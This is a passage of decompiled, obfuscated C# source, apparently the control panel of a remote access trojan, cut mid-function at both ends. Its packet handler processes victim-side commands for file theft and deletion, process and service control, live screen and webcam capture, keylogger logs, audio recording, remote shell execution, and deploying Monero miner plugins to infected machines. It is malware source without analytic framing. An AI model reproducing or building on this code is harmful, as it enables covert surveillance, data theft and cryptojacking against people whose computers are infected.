												{
													text6 = " 0 B";
												}
												IL_B839:
												goto IL_B889;
												IL_B83B:
												text6 = "0 B";
												goto IL_B839;
												IL_B844:
												num31 = -1;
												@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num30);
												IL_B85A:;
											}
											catch when (endfilter(obj59 is Exception & num30 != 0 & num31 == 0))
											{
												Exception ex85 = (Exception)obj60;
												goto IL_B844;
											}
											throw ProjectData.CreateProjectError(-2146828237);
											IL_B889:
											if (num31 != 0)
											{
												ProjectData.ClearProjectError();
											}
											string string_72 = text6;
											fTransferManager32.method_16(string_71, num142, string_72);
											fTransferManager fTransferManager_29 = Class130.fTransferManager_0;
											string file_TRANSFER_ID29 = cclient2.FILE_TRANSFER_ID;
											int num143 = 3;
											double num144 = 0.0;
											flag3 = false;
											ptr10 = ref flag3;
											num28 = num144;
											int num145 = num143;
											string string_73 = file_TRANSFER_ID29;
											fTransferManager fTransferManager33 = fTransferManager_29;
											object obj61;
											try
											{
												ProjectData.ClearProjectError();
												num30 = 2;
												string text5 = string.Empty;
												if (num28 >= 1099511627776.0)
												{
													text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " TiB";
												}
												else if (num28 >= 1073741824.0)
												{
													text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " GiB";
												}
												else if (num28 >= 1048576.0)
												{
													text5 = Strings.Format(num28 / 1024.0 / 1024.0, "#0.00") + " MiB";
												}
												else if (num28 >= 1024.0)
												{
													text5 = Strings.Format(num28 / 1024.0, "#0.00") + " KiB";
												}
												else if (num28 < 1024.0)
												{
													text5 = Conversions.ToString(Conversion.Fix(num28)) + " B";
												}
												if (ptr10)
												{
													text5 = Strings.Split(text5, " ", -1, CompareMethod.Text)[0];
												}
												if (text5.Length > 0)
												{
													text6 = text5;
												}
												else
												{
													text6 = " 0 B";
												}
												IL_BA43:
												goto IL_BA93;
												IL_BA45:
												text6 = "0 B";
												goto IL_BA43;
												IL_BA4E:
												num31 = -1;
												@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num30);
												IL_BA64:;
											}
											catch when (endfilter(obj61 is Exception & num30 != 0 & num31 == 0))
											{
												Exception ex86 = (Exception)obj62;
												goto IL_BA4E;
											}
											throw ProjectData.CreateProjectError(-2146828237);
											IL_BA93:
											if (num31 != 0)
											{
												ProjectData.ClearProjectError();
											}
											string str46 = text6;
											fTransferManager33.method_16(string_73, num145, str46 + " (0%)");
											Class130.fTransferManager_0.method_16(cclient2.FILE_TRANSFER_ID, 4, "N/A");
											Class130.fTransferManager_0.method_16(cclient2.FILE_TRANSFER_ID, 5, "Ignored (" + array9[5] + ")");
											Class130.fTransferManager_0.method_16(cclient2.FILE_TRANSFER_ID, 7, "N/A");
											Class130.concurrentDictionary_0[cclient2.FILE_TRANSFER_ID].TRANSFER_ACTIVE = false;
											ref double ptr2 = ref Class130.struct20_0.double_2;
											Class130.struct20_0.double_2 = ptr2 + (double)num;
											ptr2 = ref Class130.struct20_0.double_4;
											Class130.struct20_0.double_4 = ptr2 + 1.0;
											CClient cclient200 = Class130.concurrentDictionary_3[cclient2.FILE_TRANSFER_USER_KEY];
											ptr2 = ref cclient200.stats_bytes_in;
											cclient200.stats_bytes_in = ptr2 + (double)num;
											Class130.fTransferManager_0.method_17(cclient2.FILE_TRANSFER_ID);
											Class130.fTransferManager_0.method_26();
											stringBuilder.Clear();
											CClient cclient201 = cclient2;
											flag3 = false;
											cclient201.SOCKET_DISCONNECT(ref flag3);
										}
									}
									catch (Exception ex87)
									{
										CClient cclient202 = cclient2;
										bool flag3 = false;
										cclient202.SOCKET_DISCONNECT(ref flag3);
									}
									return;
								}
								if (!cclient2.FILE_TRANSFER_ACTIVE & !cclient2.SCREENLIVE_ACTIVE & !cclient2.SCREENLIVE_SECONDARY_ACTIVE & !cclient2.SCREEN_PREVIEW_ACTIVE & !cclient2.WEBCAM_PREVIEW_ACTIVE & !cclient2.WEBCAMSTREAM_ACTIVE & !cclient2.REMOTE_BROWSER_ACTIVE & !cclient2.SOCKET_COMMAND_ACTIVE)
								{
									if (!cclient2.bIsAuthenticated && !text14.StartsWith("con"))
									{
										CClient cclient203 = cclient2;
										bool flag3 = false;
										cclient203.SOCKET_DISCONNECT(ref flag3);
										return;
									}
									CClient cclient204 = cclient2;
									ref string ptr13 = ref text14;
									CClient cclient205 = cclient204;
									bool flag8;
									try
									{
										cclient205.sPacket.Append(ptr13);
										if (cclient205.sPacket.ToString().EndsWith("@"))
										{
											string[] array14 = Strings.Split(cclient205.sPacket.ToString(), "@", -1, CompareMethod.Text);
											long num146 = (long)(checked(array14.Length - 1));
											long num147 = 0L;
											checked
											{
												long num170;
												while (num147 <= num146)
												{
													if (array14[(int)num147].Length <= 0)
													{
														goto IL_DE1F;
													}
													if (array14[(int)num147].Contains("|"))
													{
														CClient cclient206 = cclient205;
														ref string ptr14 = ref array14[(int)num147];
														CClient cclient207 = cclient206;
														CClient.Class152 class5 = new CClient.Class152();
														class5.cclient_0 = cclient207;
														if (ptr14.EndsWith("@"))
														{
															ptr14 = ptr14.Remove(ptr14.Length - 1);
														}
														string[] array15 = Strings.Split(ptr14, "|", 4, CompareMethod.Text);
														fMain ff18 = cclient207.ff;
														CClient cclient208 = cclient207;
														long num148 = Class136.smethod_36();
														string[] array16 = array15;
														int num149 = 1;
														ref string ptr15 = ref array16[num149];
														long value4 = Conversions.ToLong(array16[num149]);
														ff18.method_19(ref cclient208, ref num148, ref value4);
														ptr15 = Conversions.ToString(value4);
														try
														{
															CClient.Class151 class6 = new CClient.Class151();
															class6.class152_0 = class5;
															class6.byte_0 = Convert.FromBase64String(array15[3]);
															class6.class152_0.string_0 = Strings.Split(Encoding.UTF8.GetString(Convert.FromBase64String(array15[3])), "|", -1, CompareMethod.Text);
															long num150 = Conversions.ToLong(array15[2]);
															string left3 = Strings.LCase(array15[0]);
															if (Operators.CompareString(left3, "cli_sleep", true) == 0)
															{
																if (Conversion.Val(class6.class152_0.string_0[0]) == 0.0)
																{
																	cclient207.pending_dc = false;
																	cclient207.pending_dc_timeout = false;
																	cclient207.bJustConnected = false;
																}
															}
															else if (Operators.CompareString(left3, "cli_hib", true) == 0)
															{
																if (Conversion.Val(class6.class152_0.string_0[0]) == 0.0)
																{
																	cclient207.pending_dc = false;
																	cclient207.pending_dc_timeout = false;
																	cclient207.bJustConnected = false;
																}
															}
															else if (Operators.CompareString(left3, "cli_log", true) == 0)
															{
																if (Conversion.Val(class6.class152_0.string_0[0]) == 0.0)
																{
																	cclient207.pending_dc = false;
																	cclient207.pending_dc_timeout = false;
																	cclient207.bJustConnected = false;
																}
															}
															else if (Operators.CompareString(left3, "cli_rs", true) == 0)
															{
																if (Conversion.Val(class6.class152_0.string_0[0]) == 0.0)
																{
																	cclient207.pending_dc = false;
																	cclient207.pending_dc_timeout = false;
																	cclient207.bJustConnected = false;
																}
															}
															else if (Operators.CompareString(left3, "cli_off", true) == 0)
															{
																if (Conversion.Val(class6.class152_0.string_0[0]) == 0.0)
																{
																	cclient207.pending_dc = false;
																	cclient207.pending_dc_timeout = false;
																	cclient207.bJustConnected = false;
																}
															}
															else if (Operators.CompareString(left3, "con", true) == 0)
															{
																int num151 = class6.class152_0.string_0.Length;
																if (num151 != 15)
																{
																	if (num151 == 16)
																	{
																		fMain ff19 = cclient207.ff;
																		cclient208 = cclient207;
																		ff19.method_20(ref cclient208, ref class6.class152_0.string_0[0], ref class6.class152_0.string_0[1], ref class6.class152_0.string_0[2], ref class6.class152_0.string_0[3], ref class6.class152_0.string_0[4], ref class6.class152_0.string_0[5], ref class6.class152_0.string_0[6], ref class6.class152_0.string_0[7], ref class6.class152_0.string_0[8], ref class6.class152_0.string_0[9], ref class6.class152_0.string_0[10], ref class6.class152_0.string_0[11], ref class6.class152_0.string_0[12], ref class6.class152_0.string_0[13], ref class6.class152_0.string_0[14], ref class6.class152_0.string_0[15]);
																	}
																}
																else
																{
																	fMain ff20 = cclient207.ff;
																	cclient208 = cclient207;
																	string[] string_74 = class6.class152_0.string_0;
																	int num152 = 0;
																	string[] string_75 = class6.class152_0.string_0;
																	int num153 = 1;
																	string[] string_76 = class6.class152_0.string_0;
																	int num154 = 2;
																	string[] string_77 = class6.class152_0.string_0;
																	int num155 = 3;
																	string[] string_78 = class6.class152_0.string_0;
																	int num156 = 4;
																	string[] string_79 = class6.class152_0.string_0;
																	int num157 = 5;
																	string[] string_80 = class6.class152_0.string_0;
																	int num158 = 6;
																	string[] string_81 = class6.class152_0.string_0;
																	int num159 = 7;
																	string[] string_82 = class6.class152_0.string_0;
																	int num160 = 8;
																	string[] string_83 = class6.class152_0.string_0;
																	int num161 = 9;
																	string[] string_84 = class6.class152_0.string_0;
																	int num162 = 10;
																	string[] string_85 = class6.class152_0.string_0;
																	int num163 = 11;
																	string[] string_86 = class6.class152_0.string_0;
																	int num164 = 12;
																	string[] string_87 = class6.class152_0.string_0;
																	int num165 = 13;
																	string[] string_88 = class6.class152_0.string_0;
																	int num166 = 14;
																	string text22 = "Default";
																	ff20.method_20(ref cclient208, ref string_74[num152], ref string_75[num153], ref string_76[num154], ref string_77[num155], ref string_78[num156], ref string_79[num157], ref string_80[num158], ref string_81[num159], ref string_82[num160], ref string_83[num161], ref string_84[num162], ref string_85[num163], ref string_86[num164], ref string_87[num165], ref string_88[num166], ref text22);
																}
															}
															else if (Operators.CompareString(left3, "info", true) == 0)
															{
																if (cclient207.fDB == null)
																{
																	CClient cclient209 = cclient207;
																	bool flag7 = true;
																	cclient209.SOCKET_DISCONNECT(ref flag7);
																	goto IL_DE40;
																}
																new Thread(new ThreadStart(class6.class152_0._Lambda$__0)).Start();
															}
															else if (Operators.CompareString(left3, "drives_get", true) == 0)
															{
																if (cclient207.fDB == null)
																{
																	CClient cclient210 = cclient207;
																	bool flag7 = true;
																	cclient210.SOCKET_DISCONNECT(ref flag7);
																	goto IL_DE40;
																}
																new Thread(new ThreadStart(class6.class152_0._Lambda$__1)).Start();
															}
															else if (Operators.CompareString(left3, "files_get", true) == 0)
															{
																if (cclient207.fDB == null)
																{
																	CClient cclient211 = cclient207;
																	bool flag7 = true;
																	cclient211.SOCKET_DISCONNECT(ref flag7);
																	goto IL_DE40;
																}
																new Thread(new ThreadStart(class6.class152_0._Lambda$__2)).Start();
															}
															else if (Operators.CompareString(left3, "files_search", true) == 0)
															{
																if (cclient207.fDB == null)
																{
																	CClient cclient212 = cclient207;
																	bool flag7 = true;
																	cclient212.SOCKET_DISCONNECT(ref flag7);
																	goto IL_DE40;
																}
																cclient207.fSrch.method_3(class6.class152_0.string_0[0], class6.class152_0.string_0[1], class6.class152_0.string_0[2], class6.class152_0.string_0[3], class6.class152_0.string_0[4], class6.class152_0.string_0[5], string.Empty, string.Empty);
															}
															else if (Operators.CompareString(left3, "files_search_error_start", true) == 0)
															{
																if (cclient207.fDB == null)
																{
																	CClient cclient213 = cclient207;
																	bool flag7 = true;
																	cclient213.SOCKET_DISCONNECT(ref flag7);
																	goto IL_DE40;
																}
																cclient207.fSrch.method_2(class6.class152_0.string_0[0]);
															}
															else if (Operators.CompareString(left3, "files_search_error_file", true) == 0)
															{
																if (cclient207.fDB == null)
																{
																	CClient cclient214 = cclient207;
																	bool flag7 = true;
																	cclient214.SOCKET_DISCONNECT(ref flag7);
																	goto IL_DE40;
																}
																cclient207.fSrch.method_3(class6.class152_0.string_0[0], class6.class152_0.string_0[1], class6.class152_0.string_0[2], "N/A", class6.class152_0.string_0[3], "N/A", string.Empty, class6.class152_0.string_0[4]);
															}
															else if (Operators.CompareString(left3, "files_search_path", true) == 0)
															{
																if (cclient207.fDB == null)
																{
																	CClient cclient215 = cclient207;
																	bool flag7 = true;
																	cclient215.SOCKET_DISCONNECT(ref flag7);
																	goto IL_DE40;
																}
																cclient207.fSrch.method_8(class6.class152_0.string_0[0]);
																cclient207.fSrch.method_1(class6.class152_0.string_0[1]);
															}
															else if (Operators.CompareString(left3, "files_search_done", true) == 0)
															{
																if (cclient207.fDB == null)
																{
																	CClient cclient216 = cclient207;
																	bool flag7 = true;
																	cclient216.SOCKET_DISCONNECT(ref flag7);
																	goto IL_DE40;
																}
																cclient207.fSrch.method_5(true, class6.class152_0.string_0[0]);
															}
															else if (Operators.CompareString(left3, "files_zip_start", true) == 0)
															{
																if (cclient207.fDB == null)
																{
																	CClient cclient217 = cclient207;
																	bool flag7 = true;
																	cclient217.SOCKET_DISCONNECT(ref flag7);
																	goto IL_DE40;
																}
																new Thread(new ThreadStart(class6.class152_0._Lambda$__3)).Start();
															}
															else if (Operators.CompareString(left3, "files_zip", true) == 0)
															{
																if (cclient207.fDB == null)
																{
																	CClient cclient218 = cclient207;
																	bool flag7 = true;
																	cclient218.SOCKET_DISCONNECT(ref flag7);
																	goto IL_DE40;
																}
																new Thread(new ThreadStart(class6.class152_0._Lambda$__4)).Start();
															}
															else if (Operators.CompareString(left3, "files_zip_end", true) == 0)
															{
																if (cclient207.fDB == null)
																{
																	CClient cclient219 = cclient207;
																	bool flag7 = true;
																	cclient219.SOCKET_DISCONNECT(ref flag7);
																	goto IL_DE40;
																}
																new Thread(new ThreadStart(class6.class152_0._Lambda$__5)).Start();
															}
															else if (Operators.CompareString(left3, "files_delete_start", true) == 0)
															{
																if (cclient207.fDB == null)
																{
																	CClient cclient220 = cclient207;
																	bool flag7 = true;
																	cclient220.SOCKET_DISCONNECT(ref flag7);
																	goto IL_DE40;
																}
																fDashboard fDB21 = cclient207.fDB;
																value4 = (long)Math.Round(Conversion.Val(class6.class152_0.string_0[0]));
																string text22 = "0";
																fDB21.method_4(ref value4, ref text22);
															}
															else if (Operators.CompareString(left3, "files_delete", true) == 0)
															{
																if (cclient207.fDB == null)
																{
																	CClient cclient221 = cclient207;
																	bool flag7 = true;
																	cclient221.SOCKET_DISCONNECT(ref flag7);
																	goto IL_DE40;
																}
																fDashboard fDB22 = cclient207.fDB;
																value4 = (long)Math.Round(Conversion.Val(class6.class152_0.string_0[0]));
																fDB22.method_4(ref value4, ref class6.class152_0.string_0[1]);
															}
															else if (Operators.CompareString(left3, "files_delete_end", true) == 0)
															{
																if (cclient207.fDB == null)
																{
																	CClient cclient222 = cclient207;
																	bool flag7 = true;
																	cclient222.SOCKET_DISCONNECT(ref flag7);
																	goto IL_DE40;
																}
																fDashboard fDB23 = cclient207.fDB;
																value4 = (long)Math.Round(Conversion.Val(class6.class152_0.string_0[0]));
																fDB23.method_4(ref value4, ref class6.class152_0.string_0[1]);
															}
															else
															{
																if (Operators.CompareString(left3, "files_download", true) == 0)
																{
																	if (cclient207.fDB == null)
																	{
																		CClient cclient223 = cclient207;
																		bool flag7 = true;
																		cclient223.SOCKET_DISCONNECT(ref flag7);
																		goto IL_DE40;
																	}
																	string text23 = string.Concat(new string[]
																	{
																		Application.StartupPath,
																		"\\Downloads\\",
																		Strings.Replace(cclient207.sUser, "\\", "^", 1, -1, CompareMethod.Text),
																		"\\",
																		Strings.Replace(class6.class152_0.string_0[0], ":", string.Empty, 1, -1, CompareMethod.Text)
																	});
																	byte[] array17 = Convert.FromBase64String(class6.class152_0.string_0[1]);
																	bool flag2 = true;
																	byte[] byte_ = array17;
																	string string_16 = text23;
																	Class136.Class142 class3 = new Class136.Class142();
																	class3.string_0 = string_16;
																	class3.byte_0 = byte_;
																	class3.bool_0 = false;
																	try
																	{
																		if (flag2)
																		{
																			new Thread(new ThreadStart(class3._Lambda$__0)).Start();
																		}
																		else
																		{
																			Class136.smethod_15(ref class3.string_0, ref class3.byte_0, class3.bool_0);
																		}
																		goto IL_DDCE;
																	}
																	catch (Exception ex88)
																	{
																		goto IL_DDCE;
																	}
																}
																if (Operators.CompareString(left3, "prc_list", true) == 0)
																{
																	if (cclient207.fDB == null)
																	{
																		CClient cclient224 = cclient207;
																		bool flag7 = true;
																		cclient224.SOCKET_DISCONNECT(ref flag7);
																		goto IL_DE40;
																	}
																	new Thread(new ThreadStart(class6.class152_0._Lambda$__6)).Start();
																}
																else if (Operators.CompareString(left3, "prc_kill", true) == 0)
																{
																	if (cclient207.fDB == null)
																	{
																		CClient cclient225 = cclient207;
																		bool flag7 = true;
																		cclient225.SOCKET_DISCONNECT(ref flag7);
																		goto IL_DE40;
																	}
																	if (Operators.CompareString(class6.class152_0.string_0[0], "1", true) == 0)
																	{
																		new Thread(new ThreadStart(class6.class152_0._Lambda$__7)).Start();
																	}
																}
																else if (Operators.CompareString(left3, "srv_list", true) == 0)
																{
																	if (cclient207.fDB == null)
																	{
																		CClient cclient226 = cclient207;
																		bool flag7 = true;
																		cclient226.SOCKET_DISCONNECT(ref flag7);
																		goto IL_DE40;
																	}
																	new Thread(new ThreadStart(class6.class152_0._Lambda$__8)).Start();
																}
																else if (Operators.CompareString(left3, "srv_start", true) == 0)
																{
																	if (cclient207.fDB == null)
																	{
																		CClient cclient227 = cclient207;
																		bool flag7 = true;
																		cclient227.SOCKET_DISCONNECT(ref flag7);
																		goto IL_DE40;
																	}
																	if (Operators.CompareString(class6.class152_0.string_0[0], "1", true) == 0)
																	{
																		new Thread(new ThreadStart(class6.class152_0._Lambda$__9)).Start();
																	}
																}
																else if (Operators.CompareString(left3, "srv_control", true) == 0)
																{
																	if (cclient207.fDB == null)
																	{
																		CClient cclient228 = cclient207;
																		bool flag7 = true;
																		cclient228.SOCKET_DISCONNECT(ref flag7);
																		goto IL_DE40;
																	}
																	if (Operators.CompareString(class6.class152_0.string_0[0], "1", true) == 0)
																	{
																		new Thread(new ThreadStart(class6.class152_0._Lambda$__10)).Start();
																	}
																}
																else if (Operators.CompareString(left3, "srv_uninstall", true) == 0)
																{
																	if (cclient207.fDB == null)
																	{
																		CClient cclient229 = cclient207;
																		bool flag7 = true;
																		cclient229.SOCKET_DISCONNECT(ref flag7);
																		goto IL_DE40;
																	}
																	if (Operators.CompareString(class6.class152_0.string_0[0], "1", true) == 0)
																	{
																		new Thread(new ThreadStart(class6.class152_0._Lambda$__11)).Start();
																	}
																}
																else if (Operators.CompareString(left3, "wnd_list", true) == 0)
																{
																	if (cclient207.fDB == null)
																	{
																		CClient cclient230 = cclient207;
																		bool flag7 = true;
																		cclient230.SOCKET_DISCONNECT(ref flag7);
																		goto IL_DE40;
																	}
																	new Thread(new ThreadStart(class6.class152_0._Lambda$__12)).Start();
																}
																else if (Operators.CompareString(left3, "wnd_cmd", true) == 0)
																{
																	if (cclient207.fDB == null)
																	{
																		CClient cclient231 = cclient207;
																		bool flag7 = true;
																		cclient231.SOCKET_DISCONNECT(ref flag7);
																		goto IL_DE40;
																	}
																	if (Operators.CompareString(class6.class152_0.string_0[0], "1", true) == 0)
																	{
																		new Thread(new ThreadStart(class6.class152_0._Lambda$__13)).Start();
																	}
																}
																else if (Operators.CompareString(left3, "wnd_title", true) == 0)
																{
																	if (cclient207.fDB == null)
																	{
																		CClient cclient232 = cclient207;
																		bool flag7 = true;
																		cclient232.SOCKET_DISCONNECT(ref flag7);
																		goto IL_DE40;
																	}
																	if (Operators.CompareString(class6.class152_0.string_0[0], "1", true) == 0)
																	{
																		new Thread(new ThreadStart(class6.class152_0._Lambda$__14)).Start();
																	}
																}
																else if (Operators.CompareString(left3, "screenlive", true) == 0)
																{
																	if (cclient207.fDB == null)
																	{
																		CClient cclient233 = cclient207;
																		bool flag7 = true;
																		cclient233.SOCKET_DISCONNECT(ref flag7);
																		goto IL_DE40;
																	}
																	if (num150 - 1L == unchecked((long)array15[3].Length))
																	{
																		MemoryStream stream6 = new MemoryStream(class6.byte_0);
																		cclient207.fDB.vmethod_24().Image = Image.FromStream(stream6);
																		cclient207.SCREEN_FPS_UPDATE((double)(Strings.Len(array15[0]) + Strings.Len(array15[1]) + Strings.Len(array15[2]) + Strings.Len(array15[3]) + 4));
																	}
																}
																else if (Operators.CompareString(left3, "screenlive_secondary", true) == 0)
																{
																	if (cclient207.fDB == null)
																	{
																		CClient cclient234 = cclient207;
																		bool flag7 = true;
																		cclient234.SOCKET_DISCONNECT(ref flag7);
																		goto IL_DE40;
																	}
																	if (num150 - 1L == unchecked((long)array15[3].Length))
																	{
																		MemoryStream stream7 = new MemoryStream(class6.byte_0);
																		cclient207.fDB.vmethod_248().Image = Image.FromStream(stream7);
																	}
																}
																else if (Operators.CompareString(left3, "screenlive_stop", true) == 0)
																{
																	if (cclient207.fDB == null)
																	{
																		CClient cclient235 = cclient207;
																		bool flag7 = true;
																		cclient235.SOCKET_DISCONNECT(ref flag7);
																		goto IL_DE40;
																	}
																	cclient207.fDB.method_6();
																}
																else if (Operators.CompareString(left3, "screen_preview_stop", true) != 0)
																{
																	if (Operators.CompareString(left3, "monitors_refresh", true) == 0)
																	{
																		if (cclient207.fDB == null)
																		{
																			CClient cclient236 = cclient207;
																			bool flag7 = true;
																			cclient236.SOCKET_DISCONNECT(ref flag7);
																			goto IL_DE40;
																		}
																		cclient207.fDB.method_7(ref class6.class152_0.string_0[0]);
																	}
																	else if (Operators.CompareString(left3, "webcamlive", true) == 0)
																	{
																		if (cclient207.fDB == null)
																		{
																			CClient cclient237 = cclient207;
																			bool flag7 = true;
																			cclient237.SOCKET_DISCONNECT(ref flag7);
																			goto IL_DE40;
																		}
																		if (num150 - 1L == unchecked((long)array15[3].Length))
																		{
																			MemoryStream stream8 = new MemoryStream(class6.byte_0);
																			cclient207.fDB.vmethod_264().Image = Image.FromStream(stream8);
																			CClient cclient238 = cclient207;
																			double num167 = (double)(Strings.Len(array15[0]) + Strings.Len(array15[1]) + Strings.Len(array15[2]) + Strings.Len(array15[3]) + 4);
																			cclient238.WEBCAM_FPS_UPDATE(ref num167);
																		}
																	}
																	else if (Operators.CompareString(left3, "webcam_start", true) == 0)
																	{
																		bool flag7;
																		if (cclient207.fDB == null)
																		{
																			CClient cclient239 = cclient207;
																			flag7 = true;
																			cclient239.SOCKET_DISCONNECT(ref flag7);
																			goto IL_DE40;
																		}
																		fDashboard fDB24 = cclient207.fDB;
																		flag7 = true;
																		fDB24.method_9(ref flag7);
																	}
																	else if (Operators.CompareString(left3, "webcam_stop", true) == 0)
																	{
																		bool flag7;
																		if (cclient207.fDB == null)
																		{
																			CClient cclient240 = cclient207;
																			flag7 = true;
																			cclient240.SOCKET_DISCONNECT(ref flag7);
																			goto IL_DE40;
																		}
																		fDashboard fDB25 = cclient207.fDB;
																		flag7 = false;
																		fDB25.method_9(ref flag7);
																	}
																	else if (Operators.CompareString(left3, "webcam_devices", true) == 0)
																	{
																		if (cclient207.fDB == null)
																		{
																			CClient cclient241 = cclient207;
																			bool flag7 = true;
																			cclient241.SOCKET_DISCONNECT(ref flag7);
																			goto IL_DE40;
																		}
																		cclient207.fDB.method_8(ref class6.class152_0.string_0[0]);
																	}
																	else if (Operators.CompareString(left3, "klgoff_list", true) == 0)
																	{
																		if (cclient207.fDB == null)
																		{
																			CClient cclient242 = cclient207;
																			bool flag7 = true;
																			cclient242.SOCKET_DISCONNECT(ref flag7);
																			goto IL_DE40;
																		}
																		cclient207.fDB.method_87(ref class6.class152_0.string_0[0]);
																	}
																	else if (Operators.CompareString(left3, "klgoff_get", true) == 0)
																	{
																		if (cclient207.fDB == null)
																		{
																			CClient cclient243 = cclient207;
																			bool flag7 = true;
																			cclient243.SOCKET_DISCONNECT(ref flag7);
																			goto IL_DE40;
																		}
																		cclient207.fDB.method_88(ref class6.class152_0.string_0[0]);
																	}
																	else if (Operators.CompareString(left3, "klgoff_del", true) == 0)
																	{
																		if (cclient207.fDB == null)
																		{
																			CClient cclient244 = cclient207;
																			bool flag7 = true;
																			cclient244.SOCKET_DISCONNECT(ref flag7);
																			goto IL_DE40;
																		}
																		cclient207.fDB.method_95(ref class6.class152_0.string_0[0]);
																	}
																	else if (Operators.CompareString(left3, "klgonlinestart", true) == 0)
																	{
																		bool flag7;
																		if (cclient207.fDB == null)
																		{
																			CClient cclient245 = cclient207;
																			flag7 = true;
																			cclient245.SOCKET_DISCONNECT(ref flag7);
																			goto IL_DE40;
																		}
																		fDashboard fDB26 = cclient207.fDB;
																		flag7 = true;
																		fDB26.method_101(ref flag7);
																	}
																	else if (Operators.CompareString(left3, "klgonlinestop", true) == 0)
																	{
																		bool flag7;
																		if (cclient207.fDB == null)
																		{
																			CClient cclient246 = cclient207;
																			flag7 = true;
																			cclient246.SOCKET_DISCONNECT(ref flag7);
																			goto IL_DE40;
																		}
																		fDashboard fDB27 = cclient207.fDB;
																		flag7 = false;
																		fDB27.method_101(ref flag7);
																	}
																	else if (Operators.CompareString(left3, "klgonlinedata", true) == 0)
																	{
																		if (cclient207.fDB == null)
																		{
																			CClient cclient247 = cclient207;
																			bool flag7 = true;
																			cclient247.SOCKET_DISCONNECT(ref flag7);
																			goto IL_DE40;
																		}
																		cclient207.fDB.method_100(ref class6.class152_0.string_0[0]);
																	}
																	else if (Operators.CompareString(left3, "aud_rec", true) == 0)
																	{
																		if (cclient207.fDB == null)
																		{
																			CClient cclient248 = cclient207;
																			bool flag7 = true;
																			cclient248.SOCKET_DISCONNECT(ref flag7);
																			goto IL_DE40;
																		}
																		new Thread(new ThreadStart(class6._Lambda$__15)).Start();
																	}
																	else if (Operators.CompareString(left3, "aud_rec_list", true) == 0)
																	{
																		if (cclient207.fDB == null)
																		{
																			CClient cclient249 = cclient207;
																			bool flag7 = true;
																			cclient249.SOCKET_DISCONNECT(ref flag7);
																			goto IL_DE40;
																		}
																		fDashboard fDB28 = cclient207.fDB;
																		string text22 = Encoding.UTF8.GetString(Convert.FromBase64String(class6.class152_0.string_0[0]));
																		fDB28.method_96(ref text22);
																	}
																	else if (Operators.CompareString(left3, "shell_start", true) == 0)
																	{
																		bool flag7;
																		if (cclient207.fDB == null)
																		{
																			CClient cclient250 = cclient207;
																			flag7 = true;
																			cclient250.SOCKET_DISCONNECT(ref flag7);
																			goto IL_DE40;
																		}
																		fDashboard fDB29 = cclient207.fDB;
																		flag7 = true;
																		fDB29.method_120(ref flag7);
																	}
																	else if (Operators.CompareString(left3, "shell_stop", true) == 0)
																	{
																		bool flag7;
																		if (cclient207.fDB == null)
																		{
																			CClient cclient251 = cclient207;
																			flag7 = true;
																			cclient251.SOCKET_DISCONNECT(ref flag7);
																			goto IL_DE40;
																		}
																		fDashboard fDB30 = cclient207.fDB;
																		flag7 = false;
																		fDB30.method_120(ref flag7);
																	}
																	else if (Operators.CompareString(left3, "shell_exec", true) == 0)
																	{
																		if (cclient207.fDB == null)
																		{
																			CClient cclient252 = cclient207;
																			bool flag7 = true;
																			cclient252.SOCKET_DISCONNECT(ref flag7);
																			goto IL_DE40;
																		}
																		cclient207.fDB.method_121(ref class6.class152_0.string_0[0]);
																	}
																	else if (Operators.CompareString(left3, "con_list", true) == 0)
																	{
																		if (cclient207.fDB == null)
																		{
																			CClient cclient253 = cclient207;
																			bool flag7 = true;
																			cclient253.SOCKET_DISCONNECT(ref flag7);
																			goto IL_DE40;
																		}
																		new Thread(new ThreadStart(class6.class152_0._Lambda$__16)).Start();
																	}
																	else if (Operators.CompareString(left3, "xmr_mine_start", true) == 0)
																	{
																		Class130.fMinerXMR_0.method_0(cclient207.sKey, cclient207.sUser);
																	}
																	else if (Operators.CompareString(left3, "xmr_mine_stop", true) == 0)
																	{
																		Class130.fMinerXMR_0.method_2(cclient207.sKey);
																	}
																	else
																	{
																		if (Operators.CompareString(left3, "xmr_mine_req", true) == 0)
																		{
																			if (Operators.CompareString(class6.class152_0.string_0[0], "0", true) != 0)
																			{
																				goto IL_DDCE;
																			}
																			string sKey15 = cclient207.sKey;
																			string str47 = "xmr_mine_data|";
																			string text22 = Application.StartupPath + "\\data\\plugins\\xmr.plg";
																			string str48 = Class136.smethod_29(ref text22);
																			string str49 = "|";
																			text22 = Application.StartupPath + "\\data\\plugins\\xmr.plg";
																			string string_17 = str47 + str48 + str49 + Class136.smethod_13(ref text22);
																			string string_18 = sKey15;
																			Class136.Class138 class4 = new Class136.Class138();
																			class4.string_0 = string_18;
																			class4.string_1 = string_17;
																			class4.long_0 = 0L;
																			try
																			{
																				if (Class130.concurrentDictionary_3.ContainsKey(class4.string_0))
																				{
																					new Thread(new ThreadStart(class4._Lambda$__0)).Start();
																				}
																				goto IL_DDCE;
																			}
																			catch (Exception ex89)
																			{
																				goto IL_DDCE;
																			}
																		}
																		if (Operators.CompareString(left3, "xmr_mine_ready", true) == 0)
																		{
																			string sKey16 = cclient207.sKey;
																			string string_17 = "xmr_mine_start|" + cclient207.MINER_LAST_SETTINGS;
																			string string_18 = sKey16;
																			Class136.Class138 class4 = new Class136.Class138();
																			class4.string_0 = string_18;
																			class4.string_1 = string_17;
																			class4.long_0 = 0L;
																			try
																			{
																				if (Class130.concurrentDictionary_3.ContainsKey(class4.string_0))
																				{
																					new Thread(new ThreadStart(class4._Lambda$__0)).Start();
																				}
																				goto IL_DDCE;
																			}
																			catch (Exception ex90)
																			{
																				goto IL_DDCE;
																			}
																		}
																		if (Operators.CompareString(left3, "xmr64_mine_req", true) == 0)
																		{
																			if (Operators.CompareString(class6.class152_0.string_0[0], "0", true) != 0)
																			{
																				goto IL_DDCE;
																			}
																			string sKey17 = cclient207.sKey;
																			string str50 = "xmr64_mine_data|";
																			string text22 = Application.StartupPath + "\\data\\plugins\\xmr64.plg";
																			string str51 = Class136.smethod_29(ref text22);
																			string str52 = "|";
																			text22 = Application.StartupPath + "\\data\\plugins\\xmr64.plg";
																			string string_17 = str50 + str51 + str52 + Class136.smethod_13(ref text22);
																			string string_18 = sKey17;
																			Class136.Class138 class4 = new Class136.Class138();
																			class4.string_0 = string_18;
																			class4.string_1 = string_17;
																			class4.long_0 = 0L;
																			try
																			{
																				if (Class130.concurrentDictionary_3.ContainsKey(class4.string_0))
																				{
